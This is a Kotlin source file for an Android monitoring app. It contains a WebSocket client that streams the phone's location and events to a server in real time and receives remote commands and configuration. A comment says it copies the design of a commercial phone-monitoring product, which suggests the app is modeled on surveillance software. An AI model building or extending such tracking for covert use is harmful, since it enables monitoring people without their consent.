package com.empresa.monitor.service.cloud

import android.content.Context
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * Real-time WebSocket client for data streaming and command relay.
 * Connects to the server's WebSocket endpoint and:
 * 1. Streams high-frequency data (location, sensor) in real-time
 * 2. Receives instant commands
 * 3. Relays status updates
 *
 * Matches KidsGuard's WebSocket implementation using OkHttp WebSocket.
 */
class WebSocketClient(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var webSocket: WebSocket? = null
    private var deviceId: String? = null
    private var serverUrl: String? = null
    private var isConnected = false
    private var reconnectAttempts = 0
    private val maxReconnectAttempts = 50

    // Queue for pending data (send when connected)
    private val pendingQueue = mutableListOf<String>()
    private val queueLock = Any()

    // Callback for received commands
    var onCommand: ((JSONObject) -> Unit)? = null

    companion object {
        private var instance: WebSocketClient? = null
        fun getInstance(context: Context): WebSocketClient {
            if (instance == null) {
                instance = WebSocketClient(context)
            }
            return instance!!
        }
    }

    fun setDeviceId(id: String) {
        deviceId = id
        buildUrl()
    }

    private fun buildUrl() {
        val base = com.empresa.monitor.BuildConfig.API_BASE_URL
            .replace("https://", "")
            .replace("http://", "")
            .removeSuffix("/api/")
            .removeSuffix("/api")

        serverUrl = "wss://$base/ws/client/${deviceId}"
    }

    fun connect() {
        if (isConnected) return
        val url = serverUrl ?: return

        try {
            val client = OkHttpClient.Builder()
                .readTimeout(0, TimeUnit.MILLISECONDS) // No timeout for read
                .pingInterval(30, TimeUnit.SECONDS)     // Keep alive
                .build()

            val request = Request.Builder()
                .url(url)
                .build()

            webSocket = client.newWebSocket(request, object : WebSocketListener() {
                override fun onOpen(webSocket: WebSocket, response: Response) {
                    isConnected = true
                    reconnectAttempts = 0

                    // Flush pending queue
                    scope.launch { flushPendingQueue() }

                    // Send auth
                    sendMessage(JSONObject().apply {
                        put("type", "auth")
                        put("device_id", deviceId)
                        put("platform", "android")
                    }.toString())
                }

                override fun onMessage(webSocket: WebSocket, text: String) {
                    try {
                        val json = JSONObject(text)
                        handleServerMessage(json)
                    } catch (e: Exception) { /* silent */ }
                }

                override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                    isConnected = false
                    webSocket.close(1000, "Closing")
                }

                override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                    isConnected = false
                    scheduleReconnect()
                }

                override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                    isConnected = false
                    scheduleReconnect()
                }
            })
        } catch (e: Exception) {
            scheduleReconnect()
        }
    }

    private fun handleServerMessage(json: JSONObject) {
        val type = json.optString("type", "")

        when (type) {
            "auth_ok" -> {
                // Authenticated
            }
            "command" -> {
                // Relay command to handlers
                onCommand?.invoke(json.optJSONObject("data") ?: json)
            }
            "config" -> {
                // Update device configuration
                val config = json.optJSONObject("config") ?: json.optJSONObject("data")
                if (config != null) {
                    sendBroadcast("com.empresa.monitor.UPDATE_CONFIG", config.toString())
                }
            }
            "ping" -> {
                sendMessage(JSONObject().apply {
                    put("type", "pong")
                    put("device_id", deviceId)
                    put("timestamp", System.currentTimeMillis())
                }.toString())
            }
        }
    }

    fun sendLocation(lat: Double, lng: Double, accuracy: Float, speed: Float) {
        if (!isConnected) {
            enqueuePending(JSONObject().apply {
                put("type", "location")
                put("lat", lat); put("lng", lng)
                put("accuracy", accuracy); put("speed", speed)
                put("timestamp", System.currentTimeMillis())
            }.toString())
            return
        }
        sendMessage(JSONObject().apply {
            put("type", "location")
            put("lat", lat); put("lng", lng)
            put("accuracy", accuracy); put("speed", speed)
            put("timestamp", System.currentTimeMillis())
        }.toString())
    }

    fun sendEvent(eventType: String, data: JSONObject) {
        sendMessage(JSONObject().apply {
            put("type", "event")
            put("event_type", eventType)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }.toString())
    }

    fun disconnect() {
        isConnected = false
        webSocket?.close(1000, "Client disconnect")
        webSocket = null
    }

    private fun sendMessage(msg: String) {
        webSocket?.send(msg)
    }

    private fun enqueuePending(msg: String) {
        synchronized(queueLock) {
            pendingQueue.add(msg)
            if (pendingQueue.size > 100) pendingQueue.removeAt(0)
        }
    }

    private suspend fun flushPendingQueue() {
        synchronized(queueLock) {
            val batch = pendingQueue.toList()
            pendingQueue.clear()
            for (msg in batch) {
                sendMessage(msg)
            }
        }
    }

    private fun scheduleReconnect() {
        if (reconnectAttempts >= maxReconnectAttempts) return
        reconnectAttempts++

        val delay = (reconnectAttempts * 2000).coerceAtMost(30_000).toLong()
        scope.launch {
            delay(delay)
            connect()
        }
    }

    private fun sendBroadcast(action: String, data: String) {
        val intent = android.content.Intent(action)
        intent.putExtra("config_json", data)
        context.sendBroadcast(intent)
    }

    fun destroy() {
        disconnect()
        scope.cancel()
        instance = null
    }
}
